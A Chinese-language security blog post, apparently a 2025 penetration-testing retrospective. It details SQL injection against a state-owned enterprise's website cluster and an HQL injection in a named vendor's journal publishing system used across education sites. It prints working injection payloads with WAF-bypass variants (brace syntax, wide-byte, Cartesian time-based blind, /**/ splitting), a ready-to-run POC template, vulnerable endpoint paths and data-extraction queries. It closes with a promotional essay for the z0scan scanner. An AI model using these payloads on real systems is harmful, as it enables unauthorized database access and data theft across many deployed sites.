---
title: 复盘2025：在WAF的缝隙里开出花来（附EDU通杀0DayPOC）
url: https://mp.weixin.qq.com/s/cFUhkXB_MrB9RX4A6o7bQw
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:40:18.265376
---

# 复盘2025：在WAF的缝隙里开出花来（附EDU通杀0DayPOC）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Xb3L3wnAiathzjnIpL8khf8wa4KibeNaGOyTnF017FiapHKJWrDbJvYTW76jPhdKeROpibyVV7LDkl8ruJibVY48icHw/0?wx_fmt=jpeg)

# 复盘2025：在WAF的缝隙里开出花来（附EDU通杀0DayPOC）

kali笔记

![]()

在小说阅读器中沉浸阅读

回头翻看去年的测试笔记，发现一个有意思的规律——

**那些最精彩的漏洞，往往藏在你觉得“这里肯定没戏”的地方。**

---

## 一、央企站群：当SQL注入遇上各种拦截

### 1. 前述 ![图片](https://mmbiz.qpic.cn/mmbiz_svg/1gvL9ficRs1E55yCKl9iaASUeogTDTdjzJed7J15qLIJyhhoqHopkFjmbD6YLsibT9vqyPG2vAm5BibZVUR2T8a9Dvr239du9DC3/640?wx_fmt=svg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

中国XX集团的站群，前台参数`cart`，后台参数`username`（借助宽字节绕过转义）。`username`处有SQL报错返回。

### 2. WAF的“选择障碍症” ![图片](https://mmbiz.qpic.cn/mmbiz_svg/1gvL9ficRs1E55yCKl9iaASUeogTDTdjzJed7J15qLIJyhhoqHopkFjmbD6YLsibT9vqyPG2vAm5BibZVUR2T8a9Dvr239du9DC3/640?wx_fmt=svg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1)

测试开始就遇阻：网站使用360webscan防御、单引号与反斜杠转义、自制403waf。

拦截：`and/or （数字）`、`/*!（字母/数字）*/`、`（数字）=/>/<（数字）`、`select （字母/数字） from`（这个待会要考）、超长字符串（360webscan绕过方案）、常规报错函数、`order by`、`limit （数字）`、`union select`。

补充，白名单绕过对360webscan不工作。

**先从前台下手。**

构建变体，直接取出数据库名称：

```
and+ascii(mid(database(),1,1))=5201314
```

注意是`（数字）=/>/<（数字）`才被拦截，而`（字符）=/>/<（数字）`是合规的。

到这里ASCII二分法就Game over了。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXH401KPHFlXNlKVyiaeXic0TQRl5T4icJ065MS5amJgjZcdzXImbicAaM8g/640?wx_fmt=png&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=2)

但这并没有结束...中危？不扶！

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXaibAeqWB6oIQ3S3cPslUQNPtUOTyJ7MNduEwtd4Y3IUp1pve2I0Xcog/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=3)

### 3. 累累碰壁 ![图片](https://mmbiz.qpic.cn/mmbiz_svg/1gvL9ficRs1E55yCKl9iaASUeogTDTdjzJed7J15qLIJyhhoqHopkFjmbD6YLsibT9vqyPG2vAm5BibZVUR2T8a9Dvr239du9DC3/640?wx_fmt=svg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4)

直接尝试从报错入手，然后就被幸福地告知：函数被禁用，不存在函数。

更过分的是，存在的函数无法抛出报错（不知道是不是环境问题）。

转变思路，回到盲注上：

尝试利用AND逻辑短路特性（偶然在一篇赛事文章中看到的）

介绍可以看：sql语句中的逻辑短路

但令我疑惑的是，这并不工作？

### 4. 花括号：最朴素的绕过 ![图片](https://mmbiz.qpic.cn/mmbiz_svg/1gvL9ficRs1E55yCKl9iaASUeogTDTdjzJed7J15qLIJyhhoqHopkFjmbD6YLsibT9vqyPG2vAm5BibZVUR2T8a9Dvr239du9DC3/640?wx_fmt=svg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5)

看来只能硬碰硬了。

在大量地翻阅资料后，我找到了它：花括号绕过

```
select{a`username`}from+companyuser
```

盲猜央企的自制WAF是串正则匹配规则？

有时候，最好的绕过不是诸如包体变形、白名单等，而是直接对症下药，寻求语句的有效变体。

试图注出具体数据：

```
and+ascii(mid((select{a`username`}from+compayuser+where+userid>1),1,1))=5201314
```

加号替代空格并不是必须的，纯属个人习惯。

### 5. 通杀 ![图片](https://mmbiz.qpic.cn/mmbiz_svg/1gvL9ficRs1E55yCKl9iaASUeogTDTdjzJed7J15qLIJyhhoqHopkFjmbD6YLsibT9vqyPG2vAm5BibZVUR2T8a9Dvr239du9DC3/640?wx_fmt=svg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6)

既然是央企站群，那么总有几个使用相同技术栈的吧？

构建Google语法，然后就喜提了几乎所有子公司及研究所的网站...

到这里故事还并没有结束，后台的故事才刚刚开始。

盲注显然行不通。

在我的试探下，我发现它的登录逻辑大致是：以键入的用户名查询数据库中的对应密码，然后尝试全匹配键入的密码

万能密码显然行不通，但这里也引发了我的深思：**并联注入拼接由我定义的密码是否能够实现万能密码的效果呢？**

回到正题， 这是我第一次应用笛卡尔积时间盲注：

```
%df'+and+ascii(mid(database(),1,1))=5201314+and+(SELECT+count(*)FROM+information_schema.columns+A)%23
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXQiawWMqoZBHjgsH023V8hvlSsCFHy7gF7lak6jK0WGD068dedjhlIgg/640?wx_fmt=png&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=7)

依旧通杀。（信息收集不齐，最终统计是12个站点）![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXRHE29lWibpNuD8dx0M7tGuPoZJ8ia3AOmnQDy5ogncXFGsPJT7Jc46Nw/640?wx_fmt=png&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=8)

其次就是未授权etc..部分后台功能点未鉴权。

提一嘴，z0scan意外在央企网站前台发现一处文本中的CRLF~

---

# 二、EDUSRC通杀：OH MY HQL！

## 1. 前述

在教育系统的漏洞挖掘中，我养成了一个习惯：**在任何参数点里，都先试一下`-1`或者`'-'1`。**

这通常情况下不会触发WAF，同时在MySQL上，这对字符型参数值同样有效。

这是一处HQL注入漏洞（在补天中请选择SQL注入提交，EDU选其它）

简单普及下：HQL注入就是利用Hibernate框架产生的注入点，使用的是HQL语法，但值得注意的是它会将合规的HQL语法转换为SQL语法后放入数据库中执行。

你可以这样理解————一个加了壳的数据库。

值得一提的是这套系统使用的是**MSSQL+Hibernate**，而非网上HQL注入所普遍的MySQL+Hibernate。

## 2. POC

POC逻辑很简单：通过`-0`判断是否允许插入字符，如修复则会返回错误页而不应返回任何有效数据。

```
id: magetaikebaokan-hql

info:
  name: 北京玛格泰克科技发展有限公司报刊系统前台HQL注入
  author: JiuZero
  severity: high
  description: 北京玛格泰克科技发展有限公司报刊系统前台HQL注入
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 8540d31e15eb7c4d541d09b938134eee

http:
- method: POST
  path:
  - '{{RootURL}}/CN/article/advancedSearchResult.do'
  headers:
    Accept: '*/*'
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
    Content-Length: "295"
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    DNT: "1"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0
    X-Requested-With: XMLHttpRequest
  body: filterName=Journal&searchSQL=1-0%5BJournal%5D

  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - id="journalFilterTable"
    condition: and

  - type: status
    part: body
    status:
    - "200"
    condition: and

# Generated From WebFuzzer on 2025-01-03 14:13:17
```

**不止一个路径。**

```
/CN/figure/figureSearchFilter.do
/CN/figure/figureSearch.do
/CN/article/searchArticleResultFilterNew.do
/CN/article/searchArticleResultFilter.do
/CN/article/advancedSearchResult.do
```

注入点判断方法相似，判断`-0`是否能够返回有效数据即可。

**Yakit**POC报告：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXOOiczINo0GQxBphFtSiaKtibibtLqff3GckOnRpnK1VAIwcCmQsnaBiaLaQ/640?wx_fmt=png&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=9)

## 3. EXP

这里主要利用了前面那篇文章所提及的**低于5.x版本逃逸：WHERE子句中可以使用数据库本身的函数**

1. 特殊情况下有效（后端代码会自动处理括号闭合问题）

```
searchSQL=(1)+and(UNICODE(substring(user,1,1))+between+109+and+109)+group+by+j_id[Journal]
```

2. 常规情况

```
searchSQL=1/(case+when+ascii(substring(db_name(),1,1))+between+0+and+1+then+1+else+0+end)[Journal]
```

3. 报错返回数据库用户名

```
searchSQL=1/(user)%5BJournal%5D
```

4. 注出数据（必须返回报错信息！）

```
searchSQL=(4)+and+(select+substring(id,1,0)+from+Article+where+id%3d1)%3d1)+group+by+j_id[Journal]
```

## 4. 特殊的WAF绕过

一次意外（`/**/`在HQL中被解析为空字符）让我发现了这个有趣的绕过方法————任意位置`/**/`绕过，以2为例：

```
searchSQL=1/(ca/**/se+when+a/**/scii(subs+tring(db_na/**/me(),1,1))+betwe/**/en+0+and+1+then+1+else+0+end)[Journal]
```

这个绕过方法对极大多数WAF是工作的，而其它绕过方法参考MSSQL绕过方法即可~

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXFBznxn4PYOZcRPzLibtf9LtFnxQXHq1IqwcTt3pQPDXHPPCxlxQictww/640?wx_fmt=png&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=10)

不算什么大通杀，证书也就拿了几本..（有些是之前刷的）![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXticF7PdNAhZ4pAH13ZT2egAEqf7pvD0micByDLORRL65ptBJT2IDaamw/640?wx_fmt=jpeg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=11)

---

# Z0SCAN

看了一圈主流工具——Xray被动扫描精准但功能局限，EZ背离开源初心转向商业化。

z0scan存在的意义，不在于比它们“更强”，而在于守住一些它们正在丢失的东西。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OfeWO54Q7PkfgGaUGAXxI4UaHUlY3NsXMpXujHCxf1N3Gz3JjNYFDnDDUIzkHqXPGk5ficGcmrX9F7PMCoiaaQlQ/640?wx_fmt=png&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=12)

## 初心：工具应该解决问题，而非制造问题

EZ的积分制把用户贡献变成了商业筹码，这是开源精神的异化。工具的核心是信任，当用户开始怀疑“我的数据会被如何利用”，工具就死了。

z0scan选择GPLv2，是选择把**所有权还给社区**。代码透明，插件开源，贡献永远属于贡献者。

商业可以有（如企业支持服务），但绝不通过阉割免费版来逼迫付费。**安全工具的底线，是让用户安心，而非焦虑。**

## 专注：在“全能”的时代，做好一件事

Xray的问题恰是它的优点：它太专注被动扫描了，以至于无法做别的。但这反过来定义了它的纯粹。

z0scan继承了这种专注。不做大而全的主机扫描器，而是把**被动扫描做到足够深**——50+漏洞类型插件、AI降误报、智能上下文识别。

通过开放API和插件架构保持扩展性，但核心永远围绕“如何更聪明地分析流量，而不是更暴力地发送流量”。

## 克制：好的工具懂得“不打扰”

商业工具在追求“功能全面”时，常忘记最朴素的需求：用户有时只想**安静、轻量、简单地**完成一次扫描。

z0scan的被动模式就是为此设计：设置代理，像正常用户一样浏览，让工具在后台默默学习、分析。

不产生攻击性流量，不触发不必要的告警。**最优雅的安全测试，应该像一场静默的对话，而非一场喧嚣的战争。**

## 最后

它可能永远不会成为功能最全的那个，但我希望它能成为**最值得信任的那个**——代码透明、逻辑清晰、永远站在用户这一边。

在这个工具日益复杂、选择日益困难的时代，**“简单、纯粹、可靠”本身就是一种力量，一种尊严。**

**代码会过时，功能会迭代，但工具的灵魂——那份解决问题的真诚——值得用每一行代码去捍卫。** 这是z0scan的故事，也是一个关于“工具为何而生”的微小回答。

# 相关信息

1. z0scan
2. CRLF双重响应
3. HQL注入深入利用
4. SQL逻辑短路
5. [SQL注入绕过总结](https://mp.weixin.qq.com/s?__biz=MzYyMzg0MTY3Mw==&mid=2247483738&idx=1&sn=dda8740e8d4e335a0e8afe9b1467c6a3&scene=21#wechat_redirect)
6. Xray议题
7. Afrog议题

---

*注：所有测试均在授权范围内进行，漏洞已提交给相关厂商并修复。部分具...